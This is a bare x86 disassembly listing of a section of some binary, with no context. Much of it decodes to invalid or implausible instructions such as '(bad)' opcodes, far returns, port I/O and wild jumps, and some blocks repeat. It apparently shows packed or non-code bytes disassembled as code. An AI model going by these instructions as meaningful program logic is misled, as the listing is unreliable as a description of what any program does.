  430534:	xor    ecx,DWORD PTR [ebp+0x33]
  430537:	mov    eax,DWORD PTR [ebx]
  430539:	lock add ecx,ebx
  43053c:	bswap  esi
  43053e:	retf   0x55d1
  430541:	test   BYTE PTR [ebx-0x5ff0ffe],cl
  430547:	jmp    0x430542
  430549:	add    BYTE PTR ds:0xebc44d8b,al
  43054f:	push   ebp
  430550:	mov    ebp,DWORD PTR [ebx]
  430552:	test   al,0x8b
  430554:	push   ebp
  430555:	clc    
  430556:	xor    ecx,ebx
  430558:	xor    ecx,esi
  43055a:	add    edx,ecx
  43055c:	add    eax,DWORD PTR [edx+0xca010f]
  430562:	push   ebp
  430563:	dec    ebp
  430564:	mov    ecx,DWORD PTR [ebx-0x34050710]
  43056a:	stc    
  43056b:	rol    DWORD PTR ds:0xebce4dd6,cl
  430571:	scas   eax,DWORD PTR es:[edi]
  430572:	mov    ecx,DWORD PTR [ebx+0x7d55c4c8]
  430578:	xor    ebp,DWORD PTR [ebx]
  43057a:	xor    edi,DWORD PTR [ebx]
  43057c:	add    esi,DWORD PTR [edi+0x3]
  43057f:	mov    ecx,DWORD PTR [edi]
  430581:	clc    
  430582:	retf   0x55cb
  430585:	into   
  430586:	mov    edi,DWORD PTR [eax+esi*8-0x6740600]
  43058d:	mov    eax,0x3376554d
  430592:	mov    esi,DWORD PTR [ebx]
  430594:	enter  0x5503,0x3
  430598:	xor    ecx,DWORD PTR [edi]
  43059a:	xor    ecx,edx
  43059c:	add    edx,DWORD PTR [ebp+0x3]
  43059f:	mov    ecx,DWORD PTR [edi]
  4305a1:	lock retf 0x4dfa
  4305a5:	stc    
  4305a6:	mov    ecx,DWORD PTR [eax]
  4305a8:	or     BYTE PTR [ebp+0x4d],cl
  4305ab:	jmp    0x107063b
  4305b0:	dec    ebp
  4305b1:	dec    ebp
  4305b2:	(bad)  
  4305b3:	mov    esp,esp
  4305b5:	clc    
  4305b6:	test   ebx,ecx
  4305b8:	clc    
  4305b9:	ror    DWORD PTR [ebp-0x2a],cl
  4305bc:	mov    esi,ecx
  4305be:	in     al,dx
  4305bf:	scas   eax,DWORD PTR es:[edi]
  4305c0:	inc    ebp
  4305c1:	mov    esi,DWORD PTR [ebx]
  4305c3:	les    ebx,FWORD PTR [ebp+edi*2+0x3be42b8b]
  4305ca:	retf   
  4305cb:	ja     0x43059b
  4305cd:	mov    ebp,DWORD PTR [eax-0x48]
  4305d0:	dec    ebp
  4305d1:	xor    ecx,DWORD PTR [di+0x3]
  4305d5:	mov    ebp,eax
  4305d7:	clc    
  4305d8:	push   ebp
  4305d9:	retf   
  4305da:	mov    dl,bl
  4305dc:	adc    esi,edx
  4305de:	jb     0x4305ae
  4305e0:	add    BYTE PTR [edi-0x3b7474b3],ch
  4305e6:	in     al,dx
  4305e7:	jge    0x4305b4
  4305e9:	sub    ecx,DWORD PTR [ebp+0x3b]
  4305ec:	mov    esi,DWORD PTR [edi-0x24]
  4305ef:	mov    ecx,DWORD PTR [esp+eiz*4+0x4d32459b]
  4305f6:	mov    BYTE PTR [ebx-0x34b20729],cl
  4305fc:	mov    edx,ebx
  4305fe:	in     al,dx
  4305ff:	(bad)  
  430600:	ror    esi,cl
  430602:	push   ebp
  430603:	scas   eax,DWORD PTR es:[edi]
  430604:	mov    ecx,DWORD PTR [ebx+0x7d8cc4dc]
  43060a:	fwait
  43060b:	sub    esi,DWORD PTR [edx]
  43060d:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  430613:	lods   al,BYTE PTR ds:[esi]
  430614:	xor    esp,DWORD PTR [ebx]
  430616:	add    ecx,DWORD PTR [ebp-0x18]
  430619:	mov    edi,DWORD PTR [ebp-0x8]
  43061c:	mov    bl,cl
  43061e:	cmp    dl,bl
  430620:	jb     0x4305f0
  430622:	add    dh,dl
  430624:	dec    ebp
  430625:	scas   eax,DWORD PTR es:[edi]
  430626:	mov    ecx,DWORD PTR [ebx+0x7dcbc4ec]
  43062c:	shr    DWORD PTR [ebx],cl
  43062e:	into   
  43062f:	cmp    edx,esi
  430631:	mov    ebp,DWORD PTR [edi-0x17fcfc58]
  430637:	dec    ebp
  430638:	dec    ebp
  430639:	mov    ecx,DWORD PTR [ebx+0x55d3ecf8]
  43063f:	retf   
  430640:	xor    edx,esi
  430642:	add    ecx,esi
  430644:	imul   ecx,edx
  430647:	mov    DWORD PTR [ebp+0x8],edx
  43064a:	xor    ecx,DWORD PTR [ebp+0x2b]
  43064d:	mov    DWORD PTR [ebx+0x7d4dece0],ecx
  430653:	add    esi,DWORD PTR [ebx]
  430655:	mov    ah,0x3
  430657:	inc    ebp
  430658:	rdtsc  
  43065a:	xlat   BYTE PTR ds:[ebx]
  43065b:	pushf  
  43065c:	jge    0x4305e7
  43065e:	xor    ebx,esp
  430660:	sub    eax,DWORD PTR [ebp-0x73]
  430663:	(bad)  
  430664:	cmp    al,al
  430666:	jb     0x4305ed
  430668:	add    al,bh
  43066a:	ror    DWORD PTR [ebp-0x7a],1
  43066d:	xor    edi,edi
  43066f:	add    edi,edi
  430671:	jmp    0x4306c0
  430673:	mov    ecx,DWORD PTR [ebx-0x34341f1c]
  430679:	dec    ebp
  43067a:	into   
  43067b:	mov    ebp,DWORD PTR [edi-0x1b737424]
  430681:	fwait
  430682:	shl    DWORD PTR [edx],cl
  430684:	retf   0x5588
  430687:	or     ecx,DWORD PTR [ebp+0x7233114d]
  43068d:	add    eax,DWORD PTR [eax]
  43068f:	call   0x8ace5be1
  430694:	fcom   DWORD PTR [ecx]
  430696:	retf   
  430697:	jb     0x4306fe
  430699:	add    ch,cl
  43069b:	dec    ebp
  43069c:	sub    ecx,DWORD PTR [edx+0x55f00b03]
  4306a2:	dec    ebp
  4306a3:	xor    ecx,DWORD PTR [ebx-0x34173bfd]
  4306a9:	jge    0x430679
  4306ab:	mov    BYTE PTR [edi+0xf723b3a],ch
  4306b1:	add    cl,dh
  4306b3:	dec    ebp
  4306b4:	dec    DWORD PTR [ebx-0x2c031b75]
  4306ba:	adc    BYTE PTR [ebp+0x1],0x8b
  4306be:	add    ah,bl
  4306c0:	jge    0x43064e
  4306c2:	push   0xffffff9b
  4306c4:	push   0x8b3032
  4306c9:	shl    BYTE PTR [ebp+0x55],0x6a
  4306cd:	xor    edi,edi
  4306cf:	xor    edx,DWORD PTR [ebx+eax*1]
  4306d2:	inc    ebp
  4306d3:	add    eax,DWORD PTR [ebp-0x7c358bf1]
  4306d9:	dec    ebp
  4306da:	or     BYTE PTR [ecx+0x4dcce883],cl
  4306e0:	jbe    0x43066d
  4306e2:	mov    esp,eax
  4306e4:	ror    bl,1
  4306e6:	enter  0x14ce,0xaf
  4306ea:	dec    DWORD PTR [ebx-0x2cef13f8]
  4306f0:	push   ebp
  4306f1:	retf   0x5540
  4306f4:	push   ebp
  4306f5:	mov    esi,DWORD PTR [edx-0x18]
  4306f8:	mov    edx,ebx
  4306fa:	cld    
  4306fb:	(bad)  
  4306fc:	sub    BYTE PTR [edi-0x1bff74ff],0x0
  430703:	sti    
  430704:	add    dh,cl
  430706:	push   0xffffff94
  430708:	call   FWORD PTR [ebx+0x3b5032d0]
  43070e:	mov    ecx,DWORD PTR [edi]
  430710:	enter  0x455e,0xff
  430714:	mov    DWORD PTR [ebx+0x5545eccc],ecx
  43071a:	xor    esi,DWORD PTR [ebx]
  43071c:	mov    DWORD PTR [ebx],0xcace0f9c
  430722:	aas    
  430723:	push   ebp
  430724:	inc    ebp
  430725:	xor    edx,esi
  430727:	add    edx,esi
  430729:	mov    eax,DWORD PTR [ebx]
  43072b:	(bad)  
  43072c:	jmp    0x4306ba
  43072e:	mov    bl,BYTE PTR [ebx-0x7674cdfb]
  430734:	rol    ah,1
  430736:	mov    esi,0xf133104d
  43073b:	mov    edx,0xff388d80
  430740:	mov    dh,0xd1
  430742:	cmp    edx,DWORD PTR [ebp+0xf]
  430745:	mov    eax,DWORD PTR [edx-0x28]
  430748:	add    BYTE PTR [ebp-0x75],bh
  43074b:	xor    edi,DWORD PTR [ebx+eax*1-0x307bf035]
  430752:	fwait
  430753:	retf   0x8632
  430756:	cmp    ebp,0x8
  430759:	call   ebx
  43075b:	inc    ebp
  43075c:	inc    ebp
  43075d:	mov    ecx,DWORD PTR [ebx+0x450008d8]
  430763:	mov    esi,DWORD PTR [ecx]
  430765:	int3   
  430766:	pushf  
  430767:	add    al,0xc7
  430769:	add    al,al
  43076b:	add    bl,al
  43076d:	(bad)  
  43076e:	clc    
  43076f:	int3   
  430770:	inc    ebp
  430771:	add    BYTE PTR [ecx],dh
  430773:	push   eax
  430774:	pushf  
  430775:	mov    edi,eax
  430777:	enter  0xc008,0x85
  43077b:	aas    
  43077c:	clc    
  43077d:	gs inc ebp
  43077f:	add    BYTE PTR [ebx+0x4d00fc7d],cl
  430785:	push   ss
  430786:	xor    ecx,DWORD PTR [ebp+0x3]
  430789:	sub    edx,DWORD PTR [ecx-0x76]
  43078c:	dec    ebp
  43078d:	add    DWORD PTR [ebx+0x88d845],ecx
  430793:	mov    esi,DWORD PTR [ebx]
  430795:	or     BYTE PTR [ebx],al
  430797:	cmp    edx,DWORD PTR [ecx-0x34]
  43079a:	dec    ebp
  43079b:	out    dx,eax
  43079c:	xor    eax,DWORD PTR [ebp+0x3]
  43079f:	mov    edx,DWORD PTR [ecx-0x28]
  4307a2:	dec    ebp
  4307a3:	add    BYTE PTR [ebx],dh
  4307a5:	push   0x518003
  4307aa:	push   eax
  4307ab:	add    BYTE PTR [ebx-0x300748b],cl
  4307b1:	sbb    BYTE PTR [ebp+0x45],cl
  4307b4:	mov    ecx,DWORD PTR [ecx+0x7d00d0d8]
  4307ba:	xor    ecx,DWORD PTR [ebx-0x3cae0bfd]
  4307c0:	dec    ebp
  4307c1:	inc    ebp
  4307c2:	xor    edx,esi
  4307c4:	add    edx,esi
  4307c6:	push   ecx
  4307c7:	(bad)  
  4307c8:	dec    ebp
  4307c9:	mov    al,ds:0xc5d83dff
  4307ce:	retf   
  4307cf:	(bad)  
  4307d0:	into   
  4307d1:	sub    bh,bh
  4307d3:	dec    esp
  4307d4:	adc    al,0x9c
  4307d6:	inc    ebp
  4307d7:	push   ebp
  4307d8:	test   DWORD PTR [edi],ecx
  4307da:	unpcklps xmm0,XMMWORD PTR [ecx-0x7ab9ff80]
  4307e1:	jmp    0xc9bc16f5
  4307e6:	add    cl,dl
  4307e8:	mov    DWORD PTR [ebp+0x8501c0],0x33454df8
  4307f2:	xor    ecx,DWORD PTR [ebp+0x728b089c]
  4307f8:	rol    BYTE PTR [eax],0x54
  4307fb:	clc    
  4307fc:	gs jb  0x430806
  4307ff:	mov    eax,DWORD PTR [ebp-0x30]
  430802:	xor    al,0x40
  430804:	sub    al,0xc7
  430806:	mov    al,ah
  430808:	add    DWORD PTR [ebp+0x4534f845],eax
  43080e:	sub    al,0x80
  430810:	mov    BYTE PTR [edx+eax*1-0x375a39],bl
  430817:	mov    ch,0xff
  430819:	clc    
  43081a:	add    DWORD PTR [ebp+0x60],0x3d
  43081e:	call   FWORD PTR [eax+eax*1-0x277a77]
  430825:	inc    ebp
  430826:	dec    DWORD PTR [ebx-0x3427f701]
  43082c:	test   esi,ecx
  43082e:	dec    DWORD PTR [ebx-0x7f8a3701]
  430834:	push   eax
  430835:	add    DWORD PTR [ebp+0x0],eax
  430838:	dec    ebx
  43083a:	or     al,0xce
  43083c:	ror    BYTE PTR [ebx-0x34173fb0],0x4
  430843:	into   
  430844:	add    BYTE PTR [ebx-0x34ff2000],cl
  43084a:	mov    esi,ecx
  43084c:	sar    bh,0x45
  43084f:	adc    al,0x8b
  430851:	clc    
  430852:	fadd   DWORD PTR [ebp+0x0]
  430855:	mov    ebp,DWORD PTR [edx+0x8]
  430858:	push   edi
  430859:	adc    BYTE PTR [eax+0x1],0x83
  43085d:	add    al,al
  43085f:	retf   
  430860:	mov    ecx,esi
  430862:	cld    
  430863:	mov    eax,DWORD PTR [eax+0xcb01c8]
  430869:	into   
  43086a:	add    BYTE PTR [ebx+0x756ae000],cl
  430870:	jne    0x4308a5
  430872:	inc    DWORD PTR [ebx]
  430874:	rcl    BYTE PTR [ecx+0x50],1
  430877:	push   eax
  430878:	mov    ecx,DWORD PTR [ecx-0xbaf7f8]
  43087e:	mov    eax,DWORD PTR [eax+ebx*8-0x14ffbafd]
  430885:	sar    bh,0x84
  430888:	or     BYTE PTR [ebx],al
  43088a:	push   eax
  43088b:	add    BYTE PTR [ebx+0x453ccc45],cl
  430891:	pushf  
  430892:	xor    edi,eax
  430894:	pushf  
  430895:	mov    ah,0x89
  430897:	test   esp,ebp
  430899:	clc    
  43089a:	inc    ebp
  43089b:	inc    ebp
  43089c:	mov    DWORD PTR [eax+eax*8],esi
  43089f:	sub    al,0x32
  4308a1:	mov    BYTE PTR [ebx+ecx*4+0x54dce089],bl
  4308a8:	dec    ebp
  4308a9:	xor    eax,DWORD PTR gs:[edi+0x3]
  4308ad:	mov    ecx,DWORD PTR [ecx+0x4d54f4b4]
  4308b3:	xor    eax,DWORD PTR gs:[edi+0x3]
  4308b7:	or     DWORD PTR [ecx+0x45ff085c],0x0
  4308be:	shl    DWORD PTR [ebp-0x380064],1
  4308c4:	enter  0x858d,0x60
  4308c8:	clc    
  4308c9:	inc    DWORD PTR [ebp+0x50]
  4308cc:	cmp    al,0x75
  4308ce:	pushf  
  4308cf:	(bad)  
  4308d0:	(bad)  
  4308d1:	pop    esp
  4308d2:	lods   al,BYTE PTR ds:[esi]
  4308d3:	inc    DWORD PTR [ebp+0x4508f8ff]
  4308d9:	mov    edi,DWORD PTR [esi]
  4308db:	rcr    BYTE PTR [eax+esi*2+0x10b883c7],1
  4308e2:	test   DWORD PTR [edi-0x8],edx
  4308e5:	sbb    al,0x45
  4308e7:	add    BYTE PTR [eax],bh
  4308e9:	push   0x8b809c
  4308ee:	loopne 0x430935
  4308f0:	push   ebp
  4308f1:	mov    esi,DWORD PTR [ebx]
  4308f3:	cld    
  4308f4:	add    eax,DWORD PTR [eax+0xf013b]
  4308fa:	adc    al,0x0
  4308fc:	add    bh,bh
  4308fe:	jmp    0xc00a1b
  430903:	add    BYTE PTR [ebp+0x45],cl
  430906:	mov    ecx,DWORD PTR [ebx+0xd1d8ec]
  43090c:	dec    ebp
  43090d:	push   0x38033
  430912:	cmp    eax,DWORD PTR [eax]
  430914:	unpcklps xmm7,xmm0
  430917:	jne    0x430919
  430919:	dec    DWORD PTR [ebx+0x5545c818]
  43091f:	mov    DWORD PTR [ebx],esi
  430921:	shl    BYTE PTR [ebx],1
  430923:	inc    ebp
  430924:	add    ecx,DWORD PTR [ecx+0x60fcc03]
  43092a:	retf   0x5575
  43092d:	dec    DWORD PTR [ebx-0x5ba13e8]
  430933:	(bad)  
  430934:	stc    
  430935:	loopne 0x430943
  430937:	test   DWORD PTR [ebp-0x8],ecx
  43093a:	xor    eax,DWORD PTR [ebp+0x3]
  43093d:	mov    ebp,ecx
  43093f:	rol    BYTE PTR [eax],1
  430941:	inc    ebp
  430942:	add    BYTE PTR [eax-0x7747ab3],bh
  430948:	clc    
  430949:	inc    ebp
  43094a:	retf   
  43094b:	mov    edx,ebx
  43094d:	loopne 0x430925
  43094f:	retf   
  430950:	into   
  430951:	into   
  430952:	scas   eax,DWORD PTR es:[edi]
  430953:	dec    ebp
  430954:	mov    ecx,DWORD PTR [ebx-0x34821f0c]
  43095a:	sub    ecx,esi
  43095c:	cmp    ecx,DWORD PTR [ebp+0x77]
  43095f:	(bad)  
  430960:	mov    edi,eax
  430962:	enter  0x8985,0xf8
  430966:	add    BYTE PTR [ebp-0x75],al
  430969:	xor    ebp,DWORD PTR [esp+ebx*4-0x57cc38ab]
  430970:	xor    eax,DWORD PTR [ebp+0x4503f803]
  430976:	(bad)  
  430978:	retf   0x559c
  43097b:	(bad)  
  43097c:	mov    esp,DWORD PTR [esp+ebp*8-0x607057b]
  430983:	inc    ebp
  430984:	add    eax,0xeb9c4d3f
  430989:	(bad)  
  43098a:	mov    esi,DWORD PTR [eax-0x7aa7a5c]
  430990:	xor    ecx,DWORD PTR [ebp+0x33]
  430993:	mov    eax,DWORD PTR [ebx]
  430995:	in     al,dx
  430996:	add    ecx,ebx
  430998:	bswap  esi
  43099a:	retf   0x55d1
  43099d:	test   BYTE PTR [ebx-0x5ff13fe],cl
  4309a3:	jmp    0x43099e
  4309a5:	add    BYTE PTR ds:0xebf44d8b,al
  4309ab:	push   ebp
  4309ac:	mov    ebp,DWORD PTR [ebx]
  4309ae:	mov    eax,0x33f8558b
  4309b3:	retf   
  4309b4:	xor    ecx,esi
  4309b6:	add    edx,ecx
  4309b8:	add    eax,DWORD PTR [edx+0xca010f]
  4309be:	push   ebp
  4309bf:	dec    ebp
  4309c0:	mov    ecx,DWORD PTR [ebx-0x34050714]
  4309c6:	stc    
  4309c7:	rol    DWORD PTR ds:0xebce4dd6,cl
  4309cd:	scas   eax,DWORD PTR es:[edi]
  4309ce:	mov    ecx,DWORD PTR [ebx+0x7d55f4b0]
  4309d4:	xor    ebp,DWORD PTR [ebx]
  4309d6:	xor    edi,DWORD PTR [ebx]
  4309d8:	add    esi,DWORD PTR [edi+0x3]
  4309db:	mov    ecx,DWORD PTR [edi]
  4309dd:	clc    
  4309de:	retf   0x55cb
  4309e1:	into   
  4309e2:	mov    edi,DWORD PTR [esp+ebp*8-0x6740600]
  4309e9:	test   al,0x4d
  4309eb:	push   ebp
  4309ec:	jbe    0x430a21
  4309ee:	mov    esi,DWORD PTR [ebx]
  4309f0:	mov    al,0x3
  4309f2:	push   ebp
  4309f3:	add    esi,DWORD PTR [ebx]
  4309f5:	rdpmc  
  4309f7:	retf   0x5503
  4309fa:	add    ecx,DWORD PTR [ebx-0x53513f1]
  430a00:	dec    ebp
  430a01:	stc    
  430a02:	mov    ecx,DWORD PTR [eax]
  430a04:	or     BYTE PTR [ebp+0x4d],cl
  430a07:	jmp    0x1370a97
  430a0c:	dec    ebp
  430a0d:	dec    ebp
  430a0e:	(bad)  
  430a0f:	mov    esp,esp
  430a11:	clc    
  430a12:	test   ebx,ecx
  430a14:	clc    
  430a15:	ror    DWORD PTR [ebp-0x2a],cl
  430a18:	mov    esi,ecx
  430a1a:	lock scas eax,DWORD PTR es:[edi]
  430a1c:	inc    ebp
  430a1d:	mov    esi,DWORD PTR [ebx]
  430a1f:	hlt    
  430a20:	pushf  
  430a21:	jge    0x4309ae
  430a23:	sub    esp,esp
  430a25:	cmp    ecx,ebx
  430a27:	ja     0x4309f7
  430a29:	mov    ebp,DWORD PTR [eax-0x58]
  430a2c:	dec    ebp
  430a2d:	xor    ecx,DWORD PTR [di+0x3]
  430a31:	mov    ebp,eax
  430a33:	clc    
  430a34:	push   ebp
  430a35:	retf   
  430a36:	mov    dl,bl
  430a38:	adc    esi,edx
  430a3a:	jb     0x430a0a
  430a3c:	add    BYTE PTR [edi-0xb7474b3],ch
  430a42:	lock jge 0x430a10
  430a45:	sub    ecx,DWORD PTR [ebp+0x3b]
  430a48:	mov    esi,DWORD PTR [edi-0x28]
  430a4b:	mov    ecx,DWORD PTR [esp+ebp*4+0x4d32459b]
  430a52:	mov    BYTE PTR [ebx-0x34b20729],cl
  430a58:	mov    edx,ebx
  430a5a:	lock (bad) 
  430a5c:	ror    esi,cl
  430a5e:	push   ebp
  430a5f:	scas   eax,DWORD PTR es:[edi]
  430a60:	mov    ecx,DWORD PTR [ebx+0x7d8cf4d8]
  430a66:	fwait
  430a67:	sub    esi,DWORD PTR [edx]
  430a69:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  430a6f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430a70:	xor    esp,DWORD PTR [ebx]
  430a72:	add    ecx,DWORD PTR [ebp-0x18]
  430a75:	mov    edi,DWORD PTR [ebp-0x8]
  430a78:	mov    bl,cl
  430a7a:	cmp    dl,bl
  430a7c:	jb     0x430a4c
  430a7e:	add    dh,dl
  430a80:	dec    ebp
  430a81:	scas   eax,DWORD PTR es:[edi]
  430a82:	mov    ecx,DWORD PTR [ebx+0x7dcbf4f0]
  430a88:	shr    DWORD PTR [ebx],cl
  430a8a:	into   
  430a8b:	cmp    edx,esi
  430a8d:	mov    ebp,DWORD PTR [edi-0x17fcfc48]
  430a93:	dec    ebp
  430a94:	dec    ebp
  430a95:	mov    ecx,DWORD PTR [ebx+0x55d3f0f8]
  430a9b:	retf   
  430a9c:	xor    edx,esi
  430a9e:	add    ecx,esi
  430aa0:	imul   ecx,edx
  430aa3:	mov    DWORD PTR [ebp+0x8],edx
  430aa6:	xor    ecx,DWORD PTR [ebp+0x2b]
  430aa9:	mov    DWORD PTR [ebx+0x7d4df0e0],ecx
  430aaf:	add    esi,DWORD PTR [ebx]
  430ab1:	rol    BYTE PTR [ebx],0x45
  430ab4:	rdtsc  
  430ab6:	xlat   BYTE PTR ds:[ebx]
  430ab7:	pushf  
  430ab8:	jge    0x430a43
  430aba:	xor    ebx,eax
  430abc:	sub    eax,DWORD PTR [ebp-0x73]
  430abf:	(bad)  
  430ac0:	cmp    dh,BYTE PTR [edx+esi*2-0x2e07ff7b]
  430ac7:	dec    ebp
  430ac8:	xchg   BYTE PTR [ebx],dh
  430aca:	inc    DWORD PTR [ebx]
  430acc:	(bad)  
  430acd:	jmp    0x430b1c
  430acf:	mov    ecx,DWORD PTR [ebx-0x34341f1c]
  430ad5:	dec    ebp
  430ad6:	into   
  430ad7:	mov    ebp,DWORD PTR [edi-0x1b737428]
  430add:	fwait
  430ade:	shl    DWORD PTR [edx],cl
  430ae0:	retf   0x5588
  430ae3:	or     ecx,DWORD PTR [ebp+0x7233114d]
  430ae9:	add    eax,DWORD PTR [eax]
  430aeb:	call   0x8ace603d
  430af0:	fcom   QWORD PTR [ecx]
  430af2:	retf   
  430af3:	jb     0x430b5a
  430af5:	add    ch,cl
  430af7:	dec    ebp
  430af8:	sub    ecx,DWORD PTR [edx+0x55ec0b03]
  430afe:	dec    ebp
  430aff:	xor    ecx,DWORD PTR [ebx-0x34170bfd]
  430b05:	jge    0x430ad5
  430b07:	mov    BYTE PTR [edi+0xf723b3a],ch
  430b0d:	add    cl,dh
  430b0f:	dec    ebp
  430b10:	dec    DWORD PTR [ebx-0x2c031b01]
  430b16:	inc    ebp
  430b17:	push   ebp
  430b18:	dec    DWORD PTR [ebx-0x73ff2734]
  430b1e:	lea    ebx,[ebx-0x7400cdac]
  430b24:	push   eax
  430b25:	mov    ah,0x45
  430b27:	push   ebp
  430b28:	mov    esi,DWORD PTR [ebx]
  430b2a:	les    esi,FWORD PTR [ebx]
  430b2c:	add    BYTE PTR [ebx],al
  430b2e:	inc    DWORD PTR [ebx]
  430b30:	mov    ecx,DWORD PTR [edi]
  430b32:	cld    
  430b33:	retf   0x4d80
  430b36:	add    DWORD PTR [ecx+0x4d30e800],ecx
  430b3c:	jne    0x430ac9
  430b3e:	jmp    eax
  430b40:	ror    bl,1
  430b42:	or     cl,dh
  430b44:	add    BYTE PTR [edi-0xf2f7475],ch
  430b4a:	not    bl
  430b4c:	adc    al,0xca
  430b4e:	inc    ebp
  430b4f:	push   ebp
  430b50:	mov    ecx,DWORD PTR [ebx-0x2cff1728]
  430b56:	push   0xaf80d6
  430b5b:	mov    eax,DWORD PTR [eax]
  430b5d:	in     al,0xff
  430b5f:	sti    
  430b60:	sbb    dh,cl
  430b62:	pop    esi
  430b63:	xchg   esp,eax
  430b64:	leave  
  430b65:	fwait
  430b66:	add    al,0x32
  430b68:	push   ebp
  430b69:	cmp    ebp,esp
  430b6b:	sqrtps xmm3,XMMWORD PTR [esi+0x4d]
  430b6f:	dec    DWORD PTR [ecx-0x740f0375]
  430b75:	push   ebp
  430b76:	cld    
  430b77:	xor    ebp,ebx
  430b79:	add    ecx,DWORD PTR [ebx-0x743576f1]
  430b7f:	push   ebp
  430b80:	clc    
  430b81:	xor    esi,ecx
  430b83:	add    esi,DWORD PTR [ebp-0x75]
  430b86:	(bad)  
  430b87:	hlt    
  430b88:	or     DWORD PTR [esi+eax*8-0x39cdf865],ecx
  430b8f:	mov    DWORD PTR [esi],eax
  430b91:	hlt    
  430b92:	(bad)  
  430b93:	dec    ebp
  430b94:	add    esi,DWORD PTR [ebx]
  430b96:	(bad)  
  430b97:	mov    edx,0xffc68d0a
  430b9c:	add    dl,cl
  430b9e:	leave  
  430b9f:	push   ebp
  430ba0:	push   ebp
  430ba1:	mov    ebp,esp
  430ba3:	fcom   QWORD PTR [ecx+0x7d]
  430ba6:	inc    ebp
  430ba7:	xor    ecx,DWORD PTR [ecx-0x74f003fd]
  430bad:	iret   
  430bae:	cld    
  430baf:	retf   0x868f
  430bb2:	loopne 0x430bb1
  430bb4:	mov    edi,edi
  430bb6:	mov    esi,DWORD PTR [ebp-0x8]
  430bb9:	mov    esi,eax
  430bbb:	cld    
  430bbc:	jne    0x430b6e
  430bbe:	mov    BYTE PTR [ecx],0xa
  430bc1:	add    dh,al
  430bc3:	test   DWORD PTR [eax],ecx
  430bc5:	inc    esi
  430bc7:	inc    DWORD PTR [edi]
  430bc9:	mov    eax,esi
  430bcb:	cld    
  430bcc:	add    DWORD PTR [eax+0x901c6],eax
  430bd2:	leave  
  430bd3:	xor    BYTE PTR [ebp+0x45],dl
  430bd6:	in     al,dx
  430bd7:	mov    edx,DWORD PTR [ecx-0x40]
  430bda:	inc    ebp
  430bdb:	add    BYTE PTR [ecx-0x74000301],cl
  430be1:	int3   
  430be2:	cld    
  430be3:	jne    0x430b9d
  430be5:	call   0xcc1ef0
  430bea:	mov    esi,DWORD PTR [ebp-0x8]
  430bed:	test   eax,esi
  430bef:	je     0x430c66
  430bf1:	mov    eax,esi
  430bf3:	cld    
  430bf4:	add    al,0x80
  430bf6:	add    WORD PTR [ecx+0x0],ax
  430bfa:	fiadd  DWORD PTR [eax]
  430bfc:	mov    BYTE PTR [eax],0x3d
  430bff:	push   0xffffffc3
  430c01:	push   esi
  430c02:	mov    edx,DWORD PTR [eax+0x51]
  430c05:	pop    edi
  430c06:	lea    ebx,[ebx-0x8]
  430c09:	ret    0x45
  430c0c:	mov    ecx,DWORD PTR [ebx-0x7240ae04]
  430c12:	xchg   eax,edi
  430c14:	mov    DWORD PTR [ebp-0x75],ecx
  430c17:	push   esi
  430c18:	clc    
  430c19:	jne    0x430beb
  430c1b:	mov    ecx,0xf8450b0b
  430c20:	(bad)  
  430c21:	push   cs
  430c22:	or     BYTE PTR [ebp-0x3a],dh
  430c25:	cmp    eax,DWORD PTR [ecx]
  430c27:	pop    esi
  430c28:	(bad)  
  430c29:	or     al,0x5
  430c2b:	inc    eax
  430c2c:	leave  
  430c2d:	jmp    0x40cf:0x25564204
  430c34:	leave  
  430c35:	in     eax,dx
  430c36:	inc    DWORD PTR [eax-0x75]
  430c39:	fimul  DWORD PTR [ebx-0x228139be]
  430c3f:	inc    eax
  430c40:	nop
  430c41:	loopne 0x430c42
  430c43:	ret    
  430c44:	mov    ecx,DWORD PTR [ebx-0x7239ae75]
  430c4a:	add    eax,0xff45e8f8
  430c4f:	push   esi
  430c50:	push   DWORD PTR [ebp-0x39]
  430c53:	mov    eax,0x7edda46
  430c58:	or     al,0x6
  430c5a:	push   DWORD PTR [ebp-0x3a]
  430c5d:	cmp    eax,DWORD PTR [edx]
  430c5f:	pop    esi
  430c60:	ret    
  430c61:	or     al,0x56
  430c63:	inc    ecx
  430c64:	push   ebp
  430c65:	jle    0x430c53
  430c67:	inc    edx
  430c68:	inc    ebp
  430c69:	int    0x1
  430c6b:	inc    ecx
  430c6c:	sub    BYTE PTR ds:0xe77541fc,ah
  430c72:	add    DWORD PTR [edx+0x1c],eax
  430c75:	retf   0xc38b
  430c78:	adc    al,0x8b
  430c7a:	xchg   edx,eax
  430c7b:	push   ecx
  430c7c:	mov    cl,BYTE PTR [ebp+0x45c8f8fe]
  430c82:	rcl    DWORD PTR [esi-0x9],cl
  430c85:	jne    0x430cd7
  430c87:	mov    eax,0x7c80ece
  430c8c:	rol    DWORD PTR [esi],cl
  430c8e:	div    DWORD PTR [ebp+0x50]
  430c91:	cmp    ecx,edx
  430c93:	pop    esi
  430c94:	dec    BYTE PTR [edx]
  430c96:	in     al,dx
  430c97:	inc    edx
  430c98:	sub    esp,ecx
  430c9a:	inc    eax
  430c9b:	(bad)  
  430c9c:	push   eax
  430c9d:	add    edx,DWORD PTR [eax-0x1f]
  430ca0:	push   edi
  430ca1:	add    dh,dh
  430ca3:	leave  
  430ca4:	adc    DWORD PTR [ebp-0x1],0xffffffec
  430ca8:	add    BYTE PTR [ecx+0x0],dl
  430cab:	inc    ebp
  430cac:	ror    DWORD PTR [ecx+0x5536fc8d],cl
  430cb2:	add    BYTE PTR [eax-0x7fbf448],bh
  430cb8:	add    al,0x2
  430cba:	jmp    0x57eb814
  430cbf:	jne    0x430ca9
  430cc1:	mov    eax,DWORD PTR [edx]
  430cc3:	or     BYTE PTR [eax],al
  430cc5:	inc    ecx
  430cc6:	stc    
  430cc7:	in     eax,dx
  430cc8:	ss inc eax
  430cca:	aas    
  430ccb:	out    0x7d,eax
  430ccd:	inc    ecx
  430cce:	mov    ebp,ecx
  430cd0:	lock ret 0x7d
  430cd4:	and    ecx,DWORD PTR [ebx-0x171777]
  430cda:	add    bh,bh
  430cdc:	aad    0xd7
  430cde:	add    dh,cl
  430ce0:	clts   
  430ce2:	(bad)  
  430ce3:	call   0xffce0be8
  430ce8:	hlt    
  430ce9:	iret   
  430cea:	jge    0x430cc2
  430cec:	rol    DWORD PTR [esi-0x80],cl
  430cef:	jmp    0x1c5bfc
  430cf4:	out    dx,al
  430cf5:	mov    eax,DWORD PTR [ebx]
  430cf7:	(bad)  
  430cf8:	pop    esi
  430cf9:	push   es
